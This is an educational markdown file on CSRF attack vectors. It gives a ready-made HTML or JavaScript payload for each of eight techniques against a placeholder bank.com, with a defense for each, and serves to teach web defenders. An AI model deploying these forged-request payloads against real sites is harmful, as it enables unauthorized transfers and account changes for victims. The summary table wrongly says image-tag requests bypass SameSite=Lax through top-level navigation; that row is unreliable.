# CSRF Attack Vectors — Deep Dive

> This file covers how CSRF attacks are delivered in practice. For defenses, see [csrf-defenses.md](csrf-defenses.md). For the overview, see [README.md](README.md).

---

## 1. Hidden Form Auto-Submit (Classic)

The most common vector. Attacker hosts a page with a form that auto-submits on load.

```html
<!-- Attacker's page: evil.com/free-iphone.html -->
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account" />
    <input type="hidden" name="amount" value="50000" />
  </form>
</body>
```

```
 User visits evil.com
       │
       ▼
 Form auto-submits POST to bank.com
       │
       ▼
 Browser attaches bank.com cookies automatically
       │
       ▼
 Bank sees valid session → processes transfer
```

**Why it works:** The browser doesn't care who created the form. A POST to `bank.com` gets `bank.com` cookies — always.

---

## 2. Image Tag GET Request

For endpoints that perform actions on GET (a bug, but common):

```html
<!-- Triggers GET request, browser attaches cookies -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" width="0" height="0" />
```

No JavaScript needed. Works in emails, forums, any place that renders HTML images.

```
 <img> tag loads → browser makes GET to bank.com
                    with cookies attached
                    
 If the endpoint performs the action on GET → exploited
```

**Lesson:** Never perform state-changing operations on GET. GET must be safe and idempotent.

---

## 3. XHR / Fetch (Limited but Real)

```js
// Works only for "simple" requests (no custom headers, form content types)
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',               // sends cookies
  body: 'to=attacker&amount=10000',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
});
```

```
 Simple request?
 ├─ YES → Browser sends it directly with cookies (no preflight)
 │        Server processes it. Response blocked by CORS, but damage done.
 │
 └─ NO  → Browser sends OPTIONS preflight first
           Server must explicitly allow the origin
           Usually blocks the attack
```

**Key insight:** CSRF is a write attack. The attacker doesn't need to read the response. Even when CORS blocks the response, the request (and its side effects) already happened.

**What makes a request "simple" (no preflight):**
- Methods: GET, HEAD, POST
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- No custom headers

---

## 4. JSON Body via Form Trick

Many APIs accept JSON. Attackers can't set `Content-Type: application/json` from a form, but some servers don't check it:

```html
<form action="https://api.bank.com/transfer" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":10000,"ignore":"' value='"}' />
</form>
```

This sends the body:

```
{"to":"attacker","amount":10000,"ignore":"="}
```

If the server parses the body as JSON regardless of `Content-Type`, the attack works.

```
 Server checks Content-Type?
 ├─ YES (requires application/json) → Attack fails (form can't set this)
 └─ NO  (parses any body as JSON)  → Attack succeeds
```

**Defense:** Always validate `Content-Type` on the server. Reject requests that don't match the expected type.

---

## 5. Clickjacking + CSRF Combo

Instead of auto-submitting, the attacker frames the real site and tricks the user into clicking the submit button themselves:

```html
<style>
  iframe { opacity: 0; position: absolute; z-index: 10; }
</style>
<button>Click for free gift!</button>
<iframe src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>
```

This bypasses some CSRF defenses because the user "voluntarily" submits the form on the real site. Frame-busting headers (`X-Frame-Options`, `frame-ancestors`) prevent this.

---

## 6. Login CSRF

Often overlooked. Attacker logs the victim into the **attacker's** account:

```html
<form action="https://bank.com/login" method="POST">
  <input name="username" value="attacker" />
  <input name="password" value="attacker-pass" />
</form>
<script>document.forms[0].submit()</script>
```

```
 Victim is now logged in as attacker
       │
       ▼
 Victim enters their credit card / personal info
       │
       ▼
 Info is saved to attacker's account
       │
       ▼
 Attacker logs in and collects the data
```

**Why it matters:** Most CSRF protections only protect authenticated actions. Login forms are often unprotected because "there's no session yet."

**Defense:** CSRF tokens on login forms too.

---

## 7. Stored CSRF (via XSS or User Content)

If the site allows user-generated HTML (forums, rich text editors, profile fields):

```html
<!-- Stored in a forum post, executes for every viewer -->
<img src="https://bank.com/api/delete-account" />
```

Every user who views the page triggers the request. This turns a stored XSS vulnerability into a mass CSRF attack.

---

## 8. Multi-Step CSRF

For actions that require multiple steps (confirm dialogs):

```html
<iframe name="frame1" style="display:none"></iframe>
<iframe name="frame2" style="display:none"></iframe>

<form action="https://bank.com/transfer" method="POST" target="frame1">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>

<form action="https://bank.com/transfer/confirm" method="POST" target="frame2">
  <input name="confirm" value="yes" />
</form>

<script>
  document.forms[0].submit();
  setTimeout(() => document.forms[1].submit(), 2000);
</script>
```

The attacker scripts the entire workflow — step 1, wait, step 2.

---

## Attack Vector Summary

| Vector | Method | Needs JS? | Bypasses SameSite=Lax? |
|--------|--------|-----------|------------------------|
| Hidden form auto-submit | POST | Yes (onload) | No |
| Image tag | GET | No | Yes (top-level nav) |
| XHR/Fetch (simple) | POST | Yes | No |
| JSON form trick | POST | Yes | No |
| Clickjacking combo | Any | No (user clicks) | Depends |
| Login CSRF | POST | Yes | No |
| Stored (via XSS) | GET | No | Yes |
| Multi-step | POST | Yes | No |

**Bottom line:** `SameSite=Lax` kills most of these. The ones that survive (GET-based, stored) are prevented by not using GET for mutations and proper input sanitization.
